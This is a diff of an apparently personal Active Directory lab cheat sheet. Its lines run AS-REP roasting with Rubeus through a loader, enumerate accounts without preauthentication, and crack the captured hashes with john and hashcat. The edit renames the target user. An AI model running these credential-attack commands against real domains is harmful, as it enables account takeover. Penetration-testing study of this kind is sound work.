@@ -32,7 +32,7 @@ Get-DomainUser -PreauthNotRequired -Verbose
 
 AS-REP BBQ
 ```powershell
-.\Loader.exe -path .\Rubeus.exe asreproast /user:VPN1user /outfile:VPN1user_asrep.txt
+.\Loader.exe -path .\Rubeus.exe -args asreproast /user:VPN548user /outfile:VPN548user_asrep.txt
 ```
 
 Crack
@@ -40,7 +40,7 @@ Crack
 john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-
 pass.txt VPN1user_asrep.txt
 
-hashcat -m 18200 VPN1user_asrep.txt ~/rockyou.txt -O -r ~/opt/wordlists/best64.rule
+hashcat -m 18200 VPN548user_asrep.txt ~/rockyou.txt -O -r ~/opt/wordlists/best64.rule
 ```
 
 ![[Pasted image 20250514193601.png]]
